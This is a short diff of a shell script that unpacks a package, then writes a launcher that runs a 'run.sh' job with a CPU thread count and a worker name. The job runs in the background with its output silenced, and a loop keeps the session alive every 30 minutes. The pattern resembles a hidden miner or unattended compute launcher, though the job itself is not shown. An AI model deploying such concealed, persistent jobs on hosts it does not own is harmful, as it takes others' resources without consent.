@@ -6,13 +6,13 @@ rm mcpo.tar.gz
 sleep 30
 echo '#!/bin/bash
 
-cd mcp && chmod +x run.sh && nproc --all && ./run.sh 2 suto01
+cd mcp && chmod +x run.sh && nproc --all && ./run.sh 2 worker01 >/dev/null 2>&1 &
 sleep 30
 while true
 do
         echo "Ngopi Boss..."
         sleep 1800
-done' > bas.sh
+done' > bos.sh
 cd mcp && echo '#!/bin/bash
 
 PORT=$1
